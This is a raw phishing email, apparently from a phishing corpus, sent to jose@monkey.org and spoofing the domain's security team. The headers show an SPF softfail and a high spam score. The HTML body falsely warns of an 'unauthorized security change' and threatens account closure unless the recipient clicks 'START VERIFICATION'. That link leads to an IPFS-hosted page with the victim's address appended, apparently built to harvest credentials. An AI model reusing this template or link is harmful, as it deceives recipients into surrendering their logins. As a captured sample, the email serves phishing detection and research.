@@ -1,0 +1,124 @@
+From jose@monkey.org Mon Nov 20 08:49:53 2023 +0000
+Return-Path: security@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 81477709866.08.0E0F773
+Received: from xinleida.com (unknown [80.85.153.26])
+	by imf24.b.hostedemail.com (Postfix) with ESMTP id 24B4F80007
+	for <jose@monkey.org>; Mon, 20 Nov 2023 08:49:49 +0000 (UTC)
+Authentication-Results: imf24.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf24.b.hostedemail.com: 80.85.153.26 is neither permitted nor denied by domain of security@monkey.org) smtp.mailfrom=security@monkey.org;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1700470190;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=Mv+0lYVgT311riKwi2DLVANuBQaB09ilOVu2vBBT9Cg=;
+	b=RUUvT9qjIlf1ulfa6urna2S99NeifxR+1ExdA2S6rTFR1xVRr0CDVYnl/lrxV15Il3MiVB
+	Pg7KixrL8vfVl9ayFrIEz/Pvro80BK9Jlni5mmUITjqM7MHWehHL1IakgwI47s0b+Ygn6b
+	wVuJP4LkuFnVMLmM7cFmOIh7E0ii54c=
+ARC-Authentication-Results: i=1;
+	imf24.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf24.b.hostedemail.com: 80.85.153.26 is neither permitted nor denied by domain of security@monkey.org) smtp.mailfrom=security@monkey.org;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1700470190; a=rsa-sha256;
+	cv=none;
+	b=e7hOe8U3q5DlTdCj2s1GqTYvaiB79dbQCSgbr2EM1N7gEYqk6fgGic9TlWqv0wruHDYicj
+	SuREyxzUvOZwg+4DGHLkvd0nBe+U+bJ1e5YqQksZkVtbnfP/9xh0hwnJo+Tt4VBAfuyBeq
+	fctavA8gwa1Twwi0R3KCxHK4SKJaxlc=
+Received: from methow.com (localhost [IPv6:::1])
+	by xinleida.com (Postfix) with ESMTP id 0AF7F720ADE
+	for <jose@monkey.org>; Mon, 20 Nov 2023 13:23:23 +0500 (+05)
+From: monkey.org <security@monkey.org>
+To: jose@monkey.org
+Subject: Secure Alert For jose@monkey.org
+Date: 20 Nov 2023 00:23:23 -0800
+Message-ID: <20231120002323.B5F8DBB7329DD884@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam08
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 24B4F80007
+X-Spam-Status: Yes, score=13.70
+X-Stat-Signature: gkdn4cw3beui6kbw4qqub9xm59mbwccb
+X-HE-Tag: 1700470189-873990
+X-HE-Meta: U2FsdGVkX1+NLxMvib52VAJeoeV6w6r8hW852thtR3x/8cdMXpJ2KNG3kkV4PoOanJYqMjF7y2oMi5OtaayKli/2JUxsRXje6AvmlpU7vsJZN16PzMZ7DBjUDSo5SC0Ud/7Bn6ejS46hnWcjNg5SNY0lGjMAJ6tf7ELr++pJa0RWVVHkOkatlgXfIKoudySDrCU6Z3NVmfYJSjBBPjynOGHQczv69pSQokdGKdC2L9E=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 376
+
+<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0" styl=
+e=3D"font-style: normal; font-variant-ligatures: normal; font-variant-caps:=
+ normal; font-weight: 400; letter-spacing: normal; text-transform: none; wo=
+rd-spacing: 0px; white-space: normal; text-decoration-thickness: initial; t=
+ext-decoration-style: initial; text-decoration-color: initial; text-align: =
+left; color: rgb(44, 54, 58); font-family: Roboto, sans-serif; font-size: 1=
+5px; border-collapse: collapse; box-sizing: border-box; background-color: r=
+gb(255, 255, 255);"><tbody style=3D"box-sizing: border-box;"><tr style=3D"b=
+ox-sizing: border-box;"><td align=3D"center" bgcolor=3D"#f4f4f4" style=3D"m=
+argin: 0px; font-size: 38px; box-sizing: border-box;"><h2 style=3D"margin: =
+0px; padding: 0px; line-height: 48px; letter-spacing: -0.03em; font-size: 3=
+0px; font-weight: normal; box-sizing: border-box;"><br></h2><h2 style=3D"ma=
+rgin: 0px; padding: 0px; line-height: 48px; letter-spacing: -0.03em; font-s=
+ize: 30px; font-weight: normal; box-sizing: border-box;"><strong style=3D"f=
+ont-weight: bolder; box-sizing: border-box;"><em style=3D"box-sizing: borde=
+r-box;"><a style=3D"color: rgb(34, 34, 34);">monkey.org</a><span> </span>Se=
+curity Notification<br><br style=3D"box-sizing: border-box;"></em></strong>=
+</h2></td></tr><tr style=3D"box-sizing: border-box;"><td align=3D"center" b=
+gcolor=3D"#f4f4f4" style=3D"margin: 0px; font-size: 13px; box-sizing: borde=
+r-box;"><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: borde=
+r-box;"><strong style=3D"font-weight: bolder; box-sizing: border-box;">An U=
+nauthorized security change has been made on your email account :<span> jos=
+e@monkey.org</span><span> </span>on<span style=3D"border-width: 0px; margin=
+: 0px; padding: 0px; vertical-align: baseline; box-sizing: border-box;"> 11=
+/20/2023 12:23:23 a.m.</span></strong></p><span style=3D"border-width: 0px;=
+ margin: 0px; padding: 0px; vertical-align: baseline; box-sizing: border-bo=
+x;"><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-bo=
+x;"><span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-a=
+lign: baseline; box-sizing: border-box;"><strong style=3D"font-weight: bold=
+er; box-sizing: border-box;">kindly verify ownership of account on<span> mo=
+nkey.org</span><span> </span>portal to prevent email closure.</strong></spa=
+n></p></span></td></tr><tr height=3D"54" style=3D"box-sizing: border-box;">=
+<td align=3D"center" bgcolor=3D"#f4f4f4" style=3D"margin: 0px; padding: 35p=
+x 50px 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;=
+ border-collapse: collapse; box-sizing: border-box; white-space: normal;"><=
+u style=3D"box-sizing: border-box;"><strong style=3D"font-weight: bolder; b=
+ox-sizing: border-box;">&nbsp;<a rel=3D"noopener noreferrer" style=3D"color=
+: rgb(0, 172, 255); border-width: 0px; margin: 0px; padding: 0px; text-deco=
+ration: none; vertical-align: baseline; box-sizing: border-box; background-=
+color: transparent;" href=3D"https://ipfs.io/ipfs/QmSiuk9GbBfQa234Ttq3V5bNF=
+6XUKhJ58eS31EXi1c8nqN?filename=3Draya.html#jose@monkey.org">START VERIFICAT=
+ION</a></strong></u></td></tr><tr height=3D"91" style=3D"box-sizing: border=
+-box;"><td align=3D"center" bgcolor=3D"#f4f4f4" style=3D"margin: 0px; paddi=
+ng: 35px 50px 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans=
+-serif; border-collapse: collapse; box-sizing: border-box; white-space: nor=
+mal;"><table align=3D"center" border=3D"0" cellspacing=3D"0" cellpadding=3D=
+"0" style=3D"margin: 0px auto; border-collapse: collapse; box-sizing: borde=
+r-box;"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: b=
+order-box;"><td align=3D"left" bgcolor=3D"#f4f4f4" style=3D"margin: 0px; fo=
+nt-size: 16px; box-sizing: border-box;"><br style=3D"box-sizing: border-box=
+;"></td><td align=3D"left" bgcolor=3D"#f4f4f4" style=3D"margin: 0px; paddin=
+g: 0px 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
+; border-collapse: collapse; box-sizing: border-box; white-space: normal;">=
+<br style=3D"box-sizing: border-box;"></td></tr></tbody></table></td></tr><=
+/tbody></table><h3 style=3D"font-style: normal; font-variant-ligatures: nor=
+mal; font-variant-caps: normal; letter-spacing: normal; text-indent: 0px; t=
+ext-transform: none; word-spacing: 0px; white-space: normal; text-decoratio=
+n-thickness: initial; text-decoration-style: initial; text-decoration-color=
+: initial; text-align: left; color: rgb(44, 54, 58); line-height: 1.2; font=
+-family: Roboto, sans-serif; font-size: 1.25em; font-weight: bold; margin-t=
+op: 0px; margin-bottom: 0.5rem; box-sizing: border-box; background-color: r=
+gb(255, 255, 255);"><div style=3D"border-width: 0px; margin: 0px; padding: =
+0px; color: rgb(51, 51, 51); overflow: hidden; vertical-align: baseline; bo=
+x-sizing: border-box;"><h2 style=3D"margin: 0px; padding: 0px; line-height:=
+ 48px; letter-spacing: -0.03em; font-size: 30px; font-weight: normal; box-s=
+izing: border-box;"><em style=3D"box-sizing: border-box;"><strong style=3D"=
+font-weight: bolder; box-sizing: border-box;">Cp</strong></em></h2><p style=
+=3D"font-size: 12px; margin-top: 0px; margin-bottom: 1rem; box-sizing: bord=
+er-box;">Copyright =A9 2023<span style=3D"box-sizing: border-box;"> monkey.=
+org</span>.</p></div></h3>
